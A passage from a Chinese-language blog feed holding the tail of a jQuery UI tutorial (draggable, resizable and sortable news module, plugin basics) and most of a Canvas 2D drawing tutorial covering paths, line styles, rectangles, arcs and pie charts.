class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"plugins/jquery-ui.css"</span> /&gt;</span><br><span class="line">&lt;script src=<span class="string">"jquery-1.12.4.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script src=<span class="string">"plugins/jquery-ui.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="html-1"><a href="#html-1" class="headerlink" title="html"></a>html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"drag-wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"drag-bar"</span>&gt;</span>可拖动、排序、变形的新闻模块<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"resize-item"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sort-wrapper"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"sort-item"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>这是第1条新闻!<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>这是第2条新闻!<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>这是第3条新闻!<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="js-1"><a href="#js-1" class="headerlink" title="js"></a>js</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">".drag-wrapper"</span>).draggable(&#123;<span class="string">"handle"</span>:<span class="string">".drag-bar"</span>&#125;);</span><br><span class="line">        $(<span class="string">".resize-item"</span>).resizable(&#123;<span class="string">"handles"</span>:<span class="string">"s"</span>&#125;);</span><br><span class="line">        $(<span class="string">".sort-item"</span>).sortable(&#123;<span class="string">"opacity"</span>:<span class="string">"0.5"</span>&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="插件制作"><a href="#插件制作" class="headerlink" title="插件制作"></a>插件制作</h3><p>制作插件：就是给jquery对象添加方法。</p><ul><li><code>$.fn.fnName = function(){}</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 CSS 选择器来识别一组文档元素，并返回一个对象表示这些元素。返回的对象提供了大量的方法来批量操作匹配的元素。&lt;/p&gt;
&lt;h2 id=&quot;jQuery前戏&quot;&gt;&lt;a href=&quot;#jQuery前戏&quot; class=&quot;headerlink&quot; title=&quot;jQuery前戏&quot;&gt;&lt;/a&gt;jQuery前戏&lt;/h2&gt;&lt;h3 id=&quot;js不足&quot;&gt;&lt;a href=&quot;#js不足&quot; class=&quot;headerlink&quot; title=&quot;js不足&quot;&gt;&lt;/a&gt;js不足&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;代码很麻烦，冗余&lt;/li&gt;
&lt;li&gt;浏览器兼容性问题&lt;/li&gt;
&lt;li&gt;入口函数只能写一个，写了多个，后面的会覆盖前面的问题&lt;/li&gt;
&lt;li&gt;js的代码容错性比较差（比较容易出错）&lt;/li&gt;
&lt;li&gt;实现一些简单的动画比较麻烦&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;什么是jquery？&quot;&gt;&lt;a href=&quot;#什么是jquery？&quot; class=&quot;headerlink&quot; title=&quot;什么是jquery？&quot;&gt;&lt;/a&gt;什么是jquery？&lt;/h3&gt;&lt;p&gt;jquery是一个js库。jquery就是一个js文件.&lt;/p&gt;
&lt;p&gt;什么是js库？js库其实就是把一些我们常用到的方法封装到一个单独的js文件里面，当我们想用的时候，引入它。（common.js animate.js）&lt;/p&gt;
&lt;p&gt;特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;丰富强大的语法&lt;/li&gt;
&lt;li&gt;高效的查询&lt;/li&gt;
&lt;li&gt;一套有用的方法&lt;/li&gt;
&lt;li&gt;强大的函数式编程技巧，批量操作元素集&lt;/li&gt;
&lt;li&gt;简洁的语言用法&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="jQuery系列" scheme="http://yoursite.com/categories/jQuery%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="jQuery" scheme="http://yoursite.com/tags/jQuery/"/>
    
  </entry>
  
  <entry>
    <title>Canvas</title>
    <link href="http://yoursite.com/2015/11/18/canvas/"/>
    <id>http://yoursite.com/2015/11/18/canvas/</id>
    <published>2015-11-17T16:00:00.000Z</published>
    <updated>2018-05-31T08:50:28.199Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是-Canvas"><a href="#什么是-Canvas" class="headerlink" title="什么是 Canvas"></a>什么是 Canvas</h2><p>canvas 是 HTML5 提供的一个用于展示绘图效果的标签. canvas 原意画布, 帆布.在 HTML 页面中用于展示绘图效果. 最早 canvas 是苹果提出的一个方案, 今天已经在大多数浏览器中实现.</p><a id="more"></a><h4 id="canvas-的基本用法"><a href="#canvas-的基本用法" class="headerlink" title="canvas 的基本用法"></a>canvas 的基本用法</h4><blockquote><p>基本语法</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas&gt;&lt;/canvas&gt;</span><br></pre></td></tr></table></figure><ul><li>使用 canvas 标签, 即可在页面中开辟一格区域. 可以设置其 width 和 height 设置该区域的尺寸.</li><li>默认 canvas 的宽高为 300 和 150.</li><li>不要使用 CSS 的方式设置宽高, 应该使用 HTML 属性.</li><li>如果浏览器不支持 canvas 标签, 那么就会将其解释为 div 标签. 因此常常在 canvas 中嵌入文本, 以提示用户浏览器的能力.</li><li>canvas 的兼容性非常强, 只要支持该标签的, 基本功能都一样, 因此不用考虑兼容性问题.</li><li>canvas 本身不能绘图. 是使用 JavaScript 来完成绘图. canvas 对象提供了各种绘图用的 api.</li></ul><blockquote><p>canvas 的使用领域</p></blockquote><p>canvas 的使用领域很多:</p><ul><li>游戏</li><li>可视化数据(重点)</li><li>banner 广告</li><li>多媒体</li><li>未来</li><li>模拟仿真</li><li>远程操作</li><li>图形编辑</li></ul><h2 id="基本绘图"><a href="#基本绘图" class="headerlink" title="基本绘图"></a>基本绘图</h2><h3 id="基本绘图方法"><a href="#基本绘图方法" class="headerlink" title="基本绘图方法"></a>基本绘图方法</h3><p><strong>绘图步骤:</strong></p><ul><li>获得 <code>canvas</code> 对象.</li><li>调用 <code>getContext</code> 方法, 提供字符串参数 ‘2d’.<ul><li>该方法返回 <code>CanvasRenderingContext2D</code> 类型的对象. 该对象提供基本的绘图命令.</li><li>使用 <code>CanvasRenderingContext2D</code> 对象提供的方法进行绘图.</li></ul></li><li>基本绘图命令<ul><li>设置开始绘图的位置: <code>context.moveTo( x, y )</code>.</li><li>设置直线到的位置: <code>context.lineTo( x, y )</code>.</li><li>描边绘制: <code>context.stroke()</code>.</li><li>填充绘制: <code>context.fill()</code>.</li><li>闭合路径: <code>context.closePath()</code>.</li></ul></li></ul><h3 id="01-绘制基本线"><a href="#01-绘制基本线" class="headerlink" title="01-绘制基本线"></a>01-绘制基本线</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.createElement( <span class="string">'canvas'</span> );</span><br><span class="line">canvas.width = <span class="number">500</span>;</span><br><span class="line">canvas.height = <span class="number">400</span>;</span><br><span class="line">canvas.style.border = <span class="string">'1px dashed red'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild( canvas );</span><br><span class="line"><span class="comment">// 获得 CanvasRenderingContext2D 对象</span></span><br><span class="line"><span class="keyword">var</span> context = canvas.getContext( <span class="string">'2d'</span> );</span><br><span class="line"><span class="comment">// 设置 起点</span></span><br><span class="line">context.moveTo( <span class="number">0</span>, <span class="number">0</span> );</span><br><span class="line"><span class="comment">// 绘制直线</span></span><br><span class="line">context.lineTo( <span class="number">500</span>, <span class="number">400</span> );</span><br><span class="line"><span class="comment">// 设置 起点</span></span><br><span class="line">context.moveTo( <span class="number">0</span>, <span class="number">400</span> );</span><br><span class="line"><span class="comment">// 绘制直线</span></span><br><span class="line">context.lineTo( <span class="number">500</span>, <span class="number">0</span> );</span><br><span class="line"><span class="comment">// 描边显示效果</span></span><br><span class="line">context.stroke();</span><br></pre></td></tr></table></figure><p>运行结果为:</p><p><img src="/images/canvas01.png" alt="canvas01"></p><h3 id="计算机直角坐标系"><a href="#计算机直角坐标系" class="headerlink" title="计算机直角坐标系"></a>计算机直角坐标系</h3><p><img src="/images/canvas02.png" alt="canvas02"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>需要绘图就需要有 <code>canvas</code> 标签, 该标签用于展示图像.</li><li><code>canvas</code> 的宽高不要使用 CSS 来设置, 会有拉伸的问题. 应该直接使用属性设置.</li><li>但是 <code>canvas</code> 只是展示图像的标签, 它没有绘图的能力. 需要使用 <code>canvas</code> 的上下文工具来实现绘图.</li><li>使用 <code>canvas.getContext(&#39;2d&#39;)</code> 可以获得绘图工具, 该工具是 <code>CanvasRenderingContext2D</code> 类型的对象.</li><li>需要绘图, 首选设置绘图的起点.<ul><li>使用 <code>canvas</code> 绘图, 需要主要的是他主张先描点, 再连线绘制效果.</li><li>因此需要首先设置起点, 然后在起点的基础上描述其他需要的点.</li><li>使用 <code>CanvasRenderingContext2D.moveTo(x, y)</code> 方法设置起点.<ul><li>其中 x, y 表示的是在坐标系中的位置.</li></ul></li></ul></li><li>使用 <code>CanvasRenderingContext2D.lineTo(x, y)</code> 来描述绘制直线的下一个点. 依次类推可以描述多个点.</li><li>描点结束后, 需要使用 <code>CanvasRenderingContext2D.stroke()</code> 方法来连线. 开可以显示出效果.</li></ul><h4 id="getContext-方法"><a href="#getContext-方法" class="headerlink" title="getContext 方法"></a>getContext 方法</h4><p>语法: <code>Canvas.getContext(typeStr)</code></p><p>描述:</p><ul><li>该方法用于绘制上下文工具.</li><li>如果是绘制平面图形使用 <code>&#39;2d&#39;</code>作为参数, 如果绘制立体图形使用 <code>&#39;webgl&#39;</code>.</li><li>使用 <code>&#39;2d&#39;</code> 返回 <code>CanvasRenderingContext2D</code> 类型的对象.</li><li>使用 <code>&#39;webgl&#39;</code> 返回 <code>WebGLRenderingContext</code> 类型的对象.</li></ul><h4 id="moveTo-方法"><a href="#moveTo-方法" class="headerlink" title="moveTo 方法"></a>moveTo 方法</h4><p>语法: <code>CanvasRenderingContext2D.moveTo(x, y)</code></p><p>描述:</p><ul><li>该方法用于设置绘制起点.</li><li>其中参数 x, y 表示在坐标系中的位置, 分别是 x 坐标与 y 坐标.</li></ul><h4 id="lineTo-方法"><a href="#lineTo-方法" class="headerlink" title="lineTo 方法"></a>lineTo 方法</h4><p>语法: <code>CanvasRenderingContext2D.lineTo(x, y)</code></p><p>描述:</p><ul><li>该方法用于设置需要绘制直线的另一个点. 最终描边后会连线当前点和方法参数描述的点.</li><li>其中参数 x, y 表示在坐标系中的位置, 分别是 x 坐标与 y 坐标.</li></ul><h4 id="stroke-方法"><a href="#stroke-方法" class="headerlink" title="stroke 方法"></a>stroke 方法</h4><p>语法: <code>CanvasRenderingContext2D.stroke()</code></p><p>描述: 该方法用于连线, 将描述的所有点按照指定顺序连接起来.</p><p><strong>总结</strong></p><ul><li>绘图先要获得上下文, 即绘图工具</li><li>绘图需要设置开始的坐标</li><li>绘图是先描点, 然后一个一个依次连线</li><li>依次绘图只能绘制单一样式(色彩等)</li></ul><p>绘制直线图形</p><ul><li>绘制直线计算坐标.</li><li>描边调用 <code>CanvasRenderingContext2D.stroke()</code> 方法.</li><li>填充使用 <code>CanvasRenderingContext2D.fill()</code> 方法.</li></ul><h4 id="fill-方法"><a href="#fill-方法" class="headerlink" title="fill 方法"></a>fill 方法</h4><p>语法: <code>CanvasRenderingContext2D.fill()</code></p><p>描述: 该方法会按照描绘的点的路径来填充图形. 默认是黑色.</p><h3 id="非零环绕原则"><a href="#非零环绕原则" class="headerlink" title="非零环绕原则"></a>非零环绕原则</h3><p>非零环绕原则</p><p><img src="/images/canvas03.jpg" alt="canvas03"></p><p>说明:</p><ul><li>在 canvas 中使用各种方法描点实际上描述的是一个称为路径( path )的东西.</li><li>在 canvas 绘图中, 所有描述的东西都是路径, 只有最后填充或描边的时候才会显示出效果.</li><li>每一个路径都是一个状态.</li></ul><h3 id="闭合路径"><a href="#闭合路径" class="headerlink" title="闭合路径"></a>闭合路径</h3><p><strong>closePath 方法</strong></p><p>语法: <code>CanvasRenderingContext2D.closePath()</code></p><p>描述: 使用该方法可以将最后一个描点与最开始的描点自动连接起来.</p><p><strong>闭合路径的一个例子</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ctx.moveTo( <span class="number">100</span>, <span class="number">100</span> );</span><br><span class="line">ctx.lineTo( <span class="number">300</span>, <span class="number">100</span> );</span><br><span class="line">ctx.lineTo( <span class="number">300</span>, <span class="number">200</span> );</span><br><span class="line">ctx.closePath();</span><br><span class="line">ctx.stroke();</span><br></pre></td></tr></table></figure><p>结果为:</p><p><img src="/images/闭合路径.png" alt="闭合路径"></p><h3 id="路径的概念"><a href="#路径的概念" class="headerlink" title="路径的概念"></a>路径的概念</h3><ul><li>路径就是一次绘图<ul><li>类比使用油漆刷墙面</li><li>首先打底色, 绝对不会一次性使用多个色彩</li><li>一定是先画完某一个色彩再考虑另一个色彩</li><li>除非需要自己创作才会考虑墙面绘画</li></ul></li><li>路径就好比一桶油漆和一把刷子, 一次性描点绘制. 如果重新更换油漆, 那么是绘制另一个区域.</li><li>如果需要开启新的绘制, 那么使用 <code>CanvasRenderingContext2D.beginPath()</code> 方法.</li></ul><h3 id="线型相关属性"><a href="#线型相关属性" class="headerlink" title="线型相关属性"></a>线型相关属性</h3><p>设置描边与填充不一定只能使用黑色的细线. 可以利用一些属性设置其效果</p><ul><li><code>CanvasRenderingContext2D.lineWidth</code> 设置线宽.</li><li><code>CanvasRenderingContext2D.lineCap</code> 设置线末端类型.</li><li><code>CanvasRenderingContext2D.lineJoin</code> 设置相交线的拐点.</li><li><code>CanvasRenderingContext2D.getLineDash()</code> 获得线段样式数组.</li><li><code>CanvasRenderingContext2D.setLineDash()</code> 设置线段样式.</li><li><code>CanvasRenderingContext2D.lineDashOffset</code> 绘制线段偏移量.</li></ul><h3 id="设置线宽"><a href="#设置线宽" class="headerlink" title="设置线宽"></a>设置线宽</h3><p>语法: <code>CanvasRenderingContext2D.lineWidth = number</code></p><p>描述: 设置线宽.</p><h3 id="设置线末端类型"><a href="#设置线末端类型" class="headerlink" title="设置线末端类型"></a>设置线末端类型</h3><p>语法: <code>CanvasRenderingContext2D.lineCap = value</code></p><p>描述:</p><p>设置线型末端的样式, 可取值为: ‘butt’( 默认 ), ‘round’, ‘square’.</p><ul><li>‘butt’ 表示两端使用方形结束.</li><li>‘round’ 表示两端使用圆角结束.</li><li>‘square’ 表示突出的圆角结束.</li></ul><h3 id="设置相交线的拐点"><a href="#设置相交线的拐点" class="headerlink" title="设置相交线的拐点"></a>设置相交线的拐点</h3><p>语法: <code>CanvasRenderingContext2D.lineJoin = value</code></p><p>描述:</p><p>设置两条直线的拐点描述方式. 可以取值 ‘round’, ‘bevel’, ‘miter’(默认)</p><ul><li>‘round’ 使用圆角连接.</li><li>‘bevel’ 使用平切连接.</li><li>‘miter’ 使用直角转.</li></ul><h3 id="虚线"><a href="#虚线" class="headerlink" title="虚线"></a>虚线</h3><p>语法:</p><p><code>CanvasRenderingContext2D.lineDashOffset = number</code><br><code>CanvasRenderingContext2D.getLineDash()</code><br><code>CanvasRenderingContext2D.setLineDash()</code></p><p>描述:</p><ul><li>setLineDash 用于设置开始绘制虚线的偏移量. 数字的正负表示左右偏移.</li><li>getLineDash() 与 setLineDash() 方法使用数组描述实线与虚线的长度.</li></ul><h3 id="填充与描边样式"><a href="#填充与描边样式" class="headerlink" title="填充与描边样式"></a>填充与描边样式</h3><p>语法:</p><p><code>CanvasRenderingContext2D.strokeStyle = value</code><br><code>CanvasRenderingContext2D.fillStyle = value</code></p><p>描述:</p><ul><li><code>strokeStyle</code> 可以设置描边颜色, 与 CSS 的语法一样</li><li><code>fillStyle</code> 设置填充颜色, 与 CSS 语法一样</li></ul><p>这两个属性还可以设置渐变对象.</p><p>一个例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;<span class="number">6</span>;j++)&#123;</span><br><span class="line">        ctx.strokeStyle = <span class="string">'rgb(0,'</span> + <span class="built_in">Math</span>.floor(<span class="number">255</span><span class="number">-42.5</span>*i) + <span class="string">','</span> + <span class="built_in">Math</span>.floor(<span class="number">255</span><span class="number">-42.5</span>*j) + <span class="string">')'</span>;</span><br><span class="line">        ctx.beginPath();</span><br><span class="line">        ctx.arc(<span class="number">12.5</span>+j*<span class="number">25</span>,<span class="number">12.5</span>+i*<span class="number">25</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="built_in">Math</span>.PI*<span class="number">2</span>,<span class="literal">true</span>);</span><br><span class="line">        ctx.stroke();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绘制形状"><a href="#绘制形状" class="headerlink" title="绘制形状"></a>绘制形状</h2><p>绘制图形不仅仅是利用线条来实现绘图, 还可以有快捷的绘制图形的办法</p><ul><li>绘制矩形</li><li>绘制圆弧</li></ul><h3 id="绘制矩形"><a href="#绘制矩形" class="headerlink" title="绘制矩形"></a>绘制矩形</h3><p>绘制矩形的方法</p><ul><li><code>CanvasRenderingContext2D.strokeRect</code></li><li><code>CanvasRenderingContext2D.fillRect</code></li><li><code>CanvasRenderingContext2D.rect</code></li></ul><p>注意: rect 方法就是矩形路径, 还需要使用 fill 或 stroke 才可以看到效果. 因此一般使用 strokeRect 或 fillRect 直接可以看到结果.</p><p>清除矩形区域: <code>CanvasRenderingContext2D.clearRect</code></p><h4 id="绘制矩形框"><a href="#绘制矩形框" class="headerlink" title="绘制矩形框"></a>绘制矩形框</h4><p>语法: <code>CanvasRenderingContext2D.strokeRect(x, y, width. height)</code></p><p>描述:</p><ul><li>用来绘制一个矩形. 比起直接使用 <code>moveTo</code> 和 <code>lineTo</code> 方法要简单许多.</li><li>该方法的前两个参数表示绘制矩形的左上角的坐标. 后两个参数表示这个矩形的宽高.</li><li>使用该方法不需要使用 <code>moveTo</code> 方法设置起始点, 也不需要调用 <code>stroke</code> 等绘画方法.</li><li>绘制的矩形支持 <code>strokeStyle</code> 设置颜色样式.</li></ul><h4 id="绘制填充矩形"><a href="#绘制填充矩形" class="headerlink" title="绘制填充矩形"></a>绘制填充矩形</h4><p>语法: <code>CanvasRenderingContext2D.fillRect(x, y, width. height)</code></p><p>描述:</p><ul><li>用来绘制一个矩形. 比起直接使用 <code>moveTo</code> 和 <code>lineTo</code> 方法要简单许多.</li><li>该方法的前两个参数表示绘制矩形的左上角的坐标. 后两个参数表示这个矩形的宽高.</li><li>使用该方法不需要使用 <code>moveTo</code> 方法设置起始点, 也不需要调用 stroke 等绘画方法.</li><li>绘制的矩形支持 <code>fillStyle</code> 设置颜色样式.</li></ul><h4 id="清除矩形区域"><a href="#清除矩形区域" class="headerlink" title="清除矩形区域"></a>清除矩形区域</h4><p>语法: <code>CanvasRenderingContext2D.clearRect(x, y, width, height)</code></p><p>描述:</p><ul><li>用于清除画布中的矩形区域的内容.</li><li>参数 x, y 表示矩形区域左上角的坐标, width 与 height 表示矩形区域的宽高.</li></ul><h3 id="绘制圆弧"><a href="#绘制圆弧" class="headerlink" title="绘制圆弧"></a>绘制圆弧</h3><p>绘制圆弧的方法有</p><ul><li>CanvasRenderingContext2D.arc()</li><li>CanvasRenderingContext2D.arcTo()</li></ul><h4 id="绘制圆弧-1"><a href="#绘制圆弧-1" class="headerlink" title="绘制圆弧"></a>绘制圆弧</h4><p>语法: <code>CanvasRenderingContext2D.arc(x, y, radius. startAngle. endAngle, anticlockwise)</code></p><p>描述:</p><ul><li>该方法用于绘制一段弧, 配合开始点的位置 与 stroke 方法或 fill 方法可以绘制扇形.</li><li>方法中的前两个参数 x, y 表示绘制圆弧的圆心坐标.</li><li>参数 radius 表示圆弧半径, 单位为弧度.</li><li>参数 startAngle 与 endAngle 表示开始到结束的角度. 角度以水平向右为 0 弧度, 顺时针为正方向.</li><li>参数 anticlockwise 表示是否采用默认的正向角度, 如果传入 true 表示逆指针为正. 该参数可选.</li></ul><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>使用 arc 绘图的时候, 如果没有设置 moveTo 那么会从开始的绘弧的地方作为起始点. 如果设置了 moveTo, 那么会连线该点与圆弧的起点.<br>如果使用 stroke 方法, 那么会从开始连线到圆弧的起始位置. 如果是 fill 方法, 会自动闭合路径填充.</p><h4 id="绘制扇形"><a href="#绘制扇形" class="headerlink" title="绘制扇形"></a>绘制扇形</h4><p>绘制扇形的重点是需要设置起始位置为圆心点, 然后闭合路径即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  ctx.strokeStyle = <span class="string">'red'</span>;</span><br><span class="line">  ctx.fillStyle = <span class="string">'pink'</span>;</span><br><span class="line">  ctx.moveTo( <span class="number">100</span>, <span class="number">200</span> );</span><br><span class="line">  ctx.arc( <span class="number">100</span>, <span class="number">200</span>, <span class="number">100</span>, -<span class="built_in">Math</span>.PI/<span class="number">3</span>, <span class="built_in">Math</span>.PI/<span class="number">3</span> );</span><br><span class="line">  ctx.closePath();</span><br><span class="line">  ctx.stroke();</span><br><span class="line">  ctx.beginPath();</span><br><span class="line">  ctx.moveTo( <span class="number">300</span>, <span class="number">200</span> );</span><br><span class="line">  ctx.arc( <span class="number">300</span>, <span class="number">200</span>, <span class="number">100</span>, -<span class="built_in">Math</span>.PI/<span class="number">3</span>, <span class="built_in">Math</span>.PI/<span class="number">3</span> );</span><br><span class="line">  ctx.closePath();</span><br><span class="line">  ctx.fill();</span><br></pre></td></tr></table></figure><p>效果</p><p><img src="/images/扇形.png" alt="扇形"></p><h4 id="绘制饼形图"><a href="#绘制饼形图" class="headerlink" title="绘制饼形图"></a>绘制饼形图</h4><p>绘制饼形图最大的特点是角度是叠加的. 开始从 <code>-Math.PI/2</code> 开始绘制, 达到执行角 x 后, 下一个区域从 x 开始绘制, 然后有到一个角 y 停下来. 如此反复到 <code>Math.PI * 3 / 2</code> 结束.</p><h5 id="三等分饼形图"><a href="#三等分饼形图" class="headerlink" title="三等分饼形图"></a>三等分饼形图</h5><p>绘制一个三等分的饼形图, 颜色使用 红, 绿, 蓝.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">200</span>, y = <span class="number">200</span>,</span><br><span class="line">    r = <span class="number">100</span>,</span><br><span class="line">    step = <span class="built_in">Math</span>.PI * <span class="number">2</span> / <span class="number">3</span>,     <span class="comment">// 120 度一个区域</span></span><br><span class="line">    start = -<span class="built_in">Math</span>.PI / <span class="number">2</span>,       <span class="comment">// 起始角度</span></span><br><span class="line">    colors = [ <span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span> ];</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ ) &#123;</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.moveTo( x, y );</span><br><span class="line">    ctx.fillStyle = colors[ i ];</span><br><span class="line">    ctx.arc( x, y, r, start, start+=step );</span><br><span class="line">    ctx.fill();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="绘制相切弧"><a href="#绘制相切弧" class="headerlink" title="绘制相切弧"></a>绘制相切弧</h4><p>语法: <code>CanvasRenderingContext2D.arcTo( x1, y1, x2, y2, radius)</code></p><p>描述:该方法用于绘制圆弧</p><ul><li>绘制的规则是当前位置与第一个参考点连线, 绘制的弧与该直线相切.</li><li>同时连接两个参考点, 圆弧根据半径与该连线相切</li></ul><p>例如有一个起始点 (100, 100), 那么绘制其点. 颜色设置为红色.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillStyle = <span class="string">'red'</span>;</span><br><span class="line">ctx.fillRect(<span class="number">100</span> - <span class="number">4</span>, <span class="number">100</span> - <span class="number">4</span>, <span class="number">8</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>然后两个参考点分别为 (100, 300) 和 (300, 300), 绘制出该点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillRect(<span class="number">100</span> - <span class="number">4</span>, <span class="number">300</span> - <span class="number">4</span>, <span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line">ctx.fillRect(<span class="number">300</span> - <span class="number">4</span>, <span class="number">300</span> - <span class="number">4</span>, <span class="number">8</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>连接两个参考点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath();</span><br><span class="line">ctx.strokeStyle = <span class="string">'red'</span>;</span><br><span class="line">ctx.moveTo(<span class="number">100</span>, <span class="number">300</span>);</span><br><span class="line">ctx.lineTo(<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">ctx.stroke();</span><br></pre></td></tr></table></figure><p>得到效果为:</p><p><img src="/images/相切.png" alt="相切"></p><p>调用 arcTo 方法绘制圆弧. 记得将起始点设置为 (100, 100)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath();</span><br><span class="line">ctx.strokeStyle = <span class="string">'blue'</span>;</span><br><span class="line">ctx.moveTo(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">ctx.arcTo(<span class="number">100</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">100</span>);</span><br><span class="line">ctx.stroke();</span><br></pre></td></tr></table></figure><p>得到效果：</p><p><img src="/images/相切2.png" alt="相切2"></p><p>注意: 使用该方法可以使用圆弧连接两条直线, 